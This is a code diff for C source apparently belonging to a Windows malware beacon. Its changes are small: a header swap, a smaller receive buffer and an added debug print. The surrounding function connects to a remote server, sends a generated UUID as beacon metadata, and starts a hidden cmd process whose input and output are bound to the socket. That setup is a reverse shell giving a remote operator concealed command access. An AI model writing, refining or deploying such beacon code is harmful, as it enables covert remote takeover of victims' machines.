@@ -7,7 +7,7 @@
 #include <wincrypt.h>
 #include <stdbool.h>
 #include <time.h>
-#include <process.h>
+#include <processthreadsapi.h>
 
 
 #pragma comment(lib, "ws2_32.lib")
@@ -77,7 +77,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     iResult = connect(s, (struct sockaddr*) &clientService, sizeof (clientService));
 
     // Generate and send beacon metadata  
-    int recvbuflen = 4098;
+    int recvbuflen = 2048;
     char *sendbuf = gen_uuid();
     char recvbuf[recvbuflen];
 
@@ -98,6 +98,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
         sinfo.hStdInput = (HANDLE)s;
         sinfo.hStdOutput = (HANDLE)s;
         sinfo.hStdError = (HANDLE)s;
+        printf("HELP");
         PROCESS_INFORMATION pinfo;
         CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
     } while( iResult >= 0 );
